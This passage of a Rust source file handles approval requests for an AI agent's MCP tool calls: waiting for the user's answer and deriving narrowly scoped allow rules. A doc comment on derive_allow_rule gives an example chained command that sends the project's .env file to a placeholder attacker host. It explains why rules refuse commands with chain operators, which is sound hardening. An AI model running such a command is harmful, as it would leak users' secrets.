    Ok(tools)
}

// ====== Permission checks ======
// MCP-13: `check_tool_permission` was dead code (zero frontend/Rust callers — the
// frontend pre-check flow it documented never shipped) and it accepted a forgeable
// agent_mode parameter. Removed; permission enforcement lives in execute_tool_call,
// whose mode is derived server-side.

/// Approval request payload (event sent to the frontend)
///
/// Note: field names must stay **snake_case**, consistent with the other LLM streaming
/// events (`llm-tool-call`/`llm-chunk`). With `rename_all="camelCase"`, `approval_id` would
/// serialize as `approvalId`, but the frontend destructures `approval_id`, leaving every
/// field `undefined` and breaking `respond_tool_approval`.
#[derive(Serialize, Clone, Debug)]
pub struct ApprovalRequestPayload {
    pub approval_id: String,
    pub server_id: String,
    pub tool_name: String,
    pub arguments: Value,
    pub reason: String,
    /// File change preview (unified diff); only carried by file-operation tools
    #[serde(skip_serializing_if = "Option::is_none")]
    pub preview_diff: Option<String>,
    /// Affected file path
    #[serde(skip_serializing_if = "Option::is_none")]
    pub file_path: Option<String>,
    /// Whether the call is bound to a project — then "always allow" persists the
    /// derived rule into `.aio/permissions.json`; otherwise it is session-scoped.
    pub project_bound: bool,
}

/// Initiate a tool call that requires user confirmation.
///
/// When `execute_tool_call` detects permission `Ask`, the flow is:
/// 1. Emit the `tool-approval-requested` event to the frontend
/// 2. Block until the frontend calls `respond_tool_approval`
/// 3. User approves → continue execution; user declines → return an error
///
/// A Drop guard removes the pending entry on EVERY exit path — including the
/// user-stop cancellation branch in `execute_tool_call`, which drops this future
/// mid-await (MCP-7: dropping used to leak the entry until a later timeout that
/// never ran).
#[allow(
    clippy::too_many_arguments,
    reason = "approval events mirror the stable payload fields explicitly"
)]
pub(crate) async fn request_tool_approval(
    app: &AppHandle,
    pending: &PendingApprovals,
    server_id: &str,
    tool_name: &str,
    arguments: &Value,
    reason: &str,
    preview_diff: Option<String>,
    file_path: Option<String>,
    project_path: Option<&str>,
) -> Result<(), String> {
    /// Removes the PendingApprovals entry when the approval wait exits for any reason
    /// (response / timeout / channel closed / future dropped by cancellation).
    /// Removal after a consumed response is a no-op, so unconditional cleanup is safe.
    struct ApprovalCleanupGuard<'a> {
        pending: &'a PendingApprovals,
        id: String,
    }
    impl Drop for ApprovalCleanupGuard<'_> {
        fn drop(&mut self) {
            self.pending.remove(&self.id);
        }
    }

    let (tx, rx) = oneshot::channel::<bool>();
    let approval_id = pending.insert(
        tx,
        crate::plugins::mcp::ApprovalContext {
            server_id: server_id.to_string(),
            tool_name: tool_name.to_string(),
            arguments: arguments.clone(),
            project_path: project_path.map(str::to_string),
        },
    );
    let _guard = ApprovalCleanupGuard {
        pending,
        id: approval_id.clone(),
    };

    // Emit the event to the frontend
    let _ = app.emit(
        ev::TOOL_APPROVAL_REQUESTED,
        ApprovalRequestPayload {
            approval_id: approval_id.clone(),
            server_id: server_id.to_string(),
            tool_name: tool_name.to_string(),
            arguments: arguments.clone(),
            reason: reason.to_string(),
            preview_diff,
            file_path,
            project_bound: project_path.is_some(),
        },
    );

    // Wait for the frontend response; every exit path cleans up via the guard
    match tokio::time::timeout(APPROVAL_WAIT_TIMEOUT, rx).await {
        Ok(Ok(true)) => Ok(()), // user approved
        Ok(Ok(false)) => Err(ierr!(
            "用户已拒绝此操作",
            "The user declined this operation"
        )),
        Ok(Err(_)) => {
            // MCP-17: tell the frontend the request is gone — without this the
            // bubble lingered until a button press hit "does not exist".
            let _ = app.emit(
                ev::TOOL_APPROVAL_EXPIRED,
                serde_json::json!({ "approval_id": approval_id }),
            );
            Err(ierr!(
                "审批通道意外关闭",
                "Approval channel closed unexpectedly"
            ))
        }
        Err(_) => {
            // MCP-17: same linkage for the timeout branch
            let _ = app.emit(
                ev::TOOL_APPROVAL_EXPIRED,
                serde_json::json!({ "approval_id": approval_id }),
            );
            Err(ierr!(
                "等待用户确认超时（600s）",
                "Timed out waiting for user confirmation (600s)"
            ))
        }
    }
}

/// Command the frontend calls to respond to a tool call approval.
///
/// # Parameters
/// - `approval_id`: the approval request id
/// - `approved`: whether the call is approved
/// - `always`: optional — `"always"` derives an allow rule from the approval context
///   and persists it into the project's `.aio/permissions.json` (never asks again,
///   across restarts; falls back to session scope without a project or on write
///   failure); `"session"` derives a process-lifetime session rule. Derivation:
///   execute_command → first-token command prefix; file write tools → same file
///   (exact path); MCP tools → same server + same tool; others → same tool name.
#[tauri::command]
pub async fn respond_tool_approval(
    pending: State<'_, PendingApprovals>,
    approval_id: String,
    approved: bool,
    always: Option<String>,
) -> Result<(), String> {
    let (tx, ctx) = pending.remove(&approval_id).ok_or_else(|| {
        ierr!(
            "审批请求 {} 不存在或已过期",
            "Approval request {} does not exist or has expired",
            approval_id
        )
    })?;
    if approved {
        match always.as_deref() {
            Some("always") => match ctx.project_path.as_deref() {
                Some(project_path) => {
                    if let Some(rule) = derive_allow_rule(&ctx, false) {
                        if let Err(e) =
                            crate::core::permission::persist_allow_rule(project_path, rule)
                        {
                            tracing::warn!(
                                "[permission] 持久化放行规则失败（{}），回退为会话级规则",
                                e
                            );
                            register_session_allow_rule(&ctx);
                        }
                    }
                }
                // Project-less chat: `.aio/permissions.json` has no home — session scope.
                None => register_session_allow_rule(&ctx),
            },
            Some("session") => register_session_allow_rule(&ctx),
            _ => {}
        }
    }
    tx.send(approved)
        .map_err(|_| ierr!("发送审批结果失败", "Failed to send approval result"))
}

/// Derive an allow rule from the approval context.
/// Rule priority is 50 (above built-in defaults); Deny rules (from any source) still always win.
///
/// SEC-02 收紧（防"一次批准打穿后续审批"）：
/// - execute_command 规则仍记录首 token 前缀，但匹配侧（permission::rule_matches）
///   额外要求完整命令**不含链式操作符**（&&/||/;/|/反引号/$()）——批准 `cargo build`
///   后 `cargo build && curl -d @.env evil.com` 依旧走审批（会话规则与持久化派生
///   规则同等约束，见 PermissionRule::auto）；
/// - 文件写入系工具只放行**同一文件**（精确路径），不再生成父目录 `/**` 递归 glob。
///
/// Returns None when no rule can be derived safely (empty execute_command string).
fn derive_allow_rule(
    ctx: &crate::plugins::mcp::ApprovalContext,
    session: bool,
) -> Option<crate::core::permission::PermissionRule> {
    use crate::core::permission::{PermissionAction, PermissionRule};
    let mut rule = PermissionRule {
        id: format!(
            "{}-{}",
            if session { "session" } else { "auto" },
            uuid::Uuid::new_v4()
        ),
        tool_pattern: ctx.tool_name.clone(),
        server_id: None,
        modes: Vec::new(),
        action: PermissionAction::Allow,
        path_pattern: None,
        command_prefix: None,
        session,
        auto: !session,
        priority: 50,
    };
    match ctx.tool_name.as_str() {
        tool_names::EXECUTE_COMMAND => {
            // First-token command prefix (e.g. cargo / npm / git); the rule only
            // matches chain-operator-free commands (see permission::rule_matches).
            let cmd = ctx
                .arguments
                .get("command")
                .and_then(|v| v.as_str())
                .unwrap_or("");
            match cmd.split_whitespace().next() {
                Some(first) => rule.command_prefix = Some(first.to_string()),
                // MCP-18: an empty/missing command string cannot derive a prefix —
                // skip the rule entirely. A prefix-less execute_command rule would
                // match EVERY later command (rule_matches only restricts when
                // command_prefix is Some).
                None => {
                    tracing::warn!(
                        "[permission] 空 command 无法派生 execute_command 放行规则，跳过"
                    );
                    return None;
                }
            }
        }
        tool_names::WRITE_FILE
        | tool_names::REPLACE_IN_FILE
        | tool_names::DELETE_FILE
        | tool_names::MAKE_DIRECTORY => {
            // Same file only (exact path). The historic parent + "/**" glob turned
            // one approval into a whole-directory (root: whole-project) write pass.
            if let Some(path) = ctx.arguments.get("path").and_then(|v| v.as_str()) {
                rule.path_pattern = Some(path.to_string());
            }
        }
        _ => {
            // MCP tools: scope to the same server (when not a builtin server)
            if ctx.server_id != crate::core::ids::BUILTIN_SERVER_ID
                && ctx.server_id != crate::core::ids::BUILTIN_FS_SERVER_ID
            {
                rule.server_id = Some(ctx.server_id.clone());
            }
        }
    }
    Some(rule)
}

fn register_session_allow_rule(ctx: &crate::plugins::mcp::ApprovalContext) {
    if let Some(rule) = derive_allow_rule(ctx, true) {
        tracing::info!(
            "[permission] 会话级放行规则: tool={} prefix={:?} path={:?}",
            rule.tool_pattern,
            rule.command_prefix,
            rule.path_pattern
        );
        crate::core::permission::add_session_rule(rule);
    }
}

/// List the resources of a given MCP server.
#[tauri::command]
pub async fn list_mcp_resources(
    mgr: State<'_, McpServerManager>,
    state: State<'_, McpServerState>,
    id: String,
) -> Result<Vec<McpResource>, String> {
    // Config-agnostic informational lookup (no project context on this path; MCP-12)
    let conn = state
        .get_any(&id)
        .ok_or_else(|| ierr!("MCP server 未连接: {}", "MCP server not connected: {}", id))?;
    let plugin = mgr.get(&conn.transport_kind).ok_or_else(|| {
        ierr!(
            "未注册 transport 插件: {}",
            "No transport plugin registered for: {}",
            conn.transport_kind
        )
    })?;
    plugin
        .list_resources(&conn)
        .await
        .map_err(|e| ierr!("resources/list 失败: {}", "resources/list failed: {}", e))
}

/// Read one resource of a given MCP server.
#[tauri::command]
pub async fn read_mcp_resource(
    mgr: State<'_, McpServerManager>,
    state: State<'_, McpServerState>,
    id: String,
    uri: String,
) -> Result<ReadResourceResult, String> {
    // Config-agnostic informational lookup (no project context on this path; MCP-12)
    let conn = state
        .get_any(&id)
        .ok_or_else(|| ierr!("MCP server 未连接: {}", "MCP server not connected: {}", id))?;
    let plugin = mgr.get(&conn.transport_kind).ok_or_else(|| {
        ierr!(
            "未注册 transport 插件: {}",
            "No transport plugin registered for: {}",
            conn.transport_kind
        )
    })?;
    plugin
        .read_resource(&conn, &uri)
        .await
        .map_err(|e| ierr!("resources/read 失败: {}", "resources/read failed: {}", e))
}

/// List the prompts of a given MCP server.
#[tauri::command]
pub async fn list_mcp_prompts(
    mgr: State<'_, McpServerManager>,
    state: State<'_, McpServerState>,
    id: String,
) -> Result<Vec<McpPrompt>, String> {
    // Config-agnostic informational lookup (no project context on this path; MCP-12)
    let conn = state
        .get_any(&id)
        .ok_or_else(|| ierr!("MCP server 未连接: {}", "MCP server not connected: {}", id))?;
    let plugin = mgr.get(&conn.transport_kind).ok_or_else(|| {
        ierr!(
            "未注册 transport 插件: {}",
            "No transport plugin registered for: {}",
            conn.transport_kind
        )
    })?;
    plugin
        .list_prompts(&conn)
        .await
        .map_err(|e| ierr!("prompts/list 失败: {}", "prompts/list failed: {}", e))
}

/// Get one prompt of a given MCP server.
#[tauri::command]
pub async fn get_mcp_prompt(
    mgr: State<'_, McpServerManager>,
    state: State<'_, McpServerState>,
    id: String,
    name: String,
    arguments: Option<Value>,
) -> Result<GetPromptResult, String> {
    // Config-agnostic informational lookup (no project context on this path; MCP-12)
    let conn = state
        .get_any(&id)
        .ok_or_else(|| ierr!("MCP server 未连接: {}", "MCP server not connected: {}", id))?;
    let plugin = mgr.get(&conn.transport_kind).ok_or_else(|| {
        ierr!(
            "未注册 transport 插件: {}",
            "No transport plugin registered for: {}",
            conn.transport_kind
        )
    })?;
    plugin
        .get_prompt(&conn, &name, arguments)
        .await
        .map_err(|e| ierr!("prompts/get 失败: {}", "prompts/get failed: {}", e))
}

/// For testing: list registered transport plugin identifiers
#[tauri::command]
pub async fn list_mcp_transports(mgr: State<'_, McpServerManager>) -> Result<Vec<String>, String> {
    Ok(mgr.list().into_iter().map(|s| s.to_string()).collect())
}
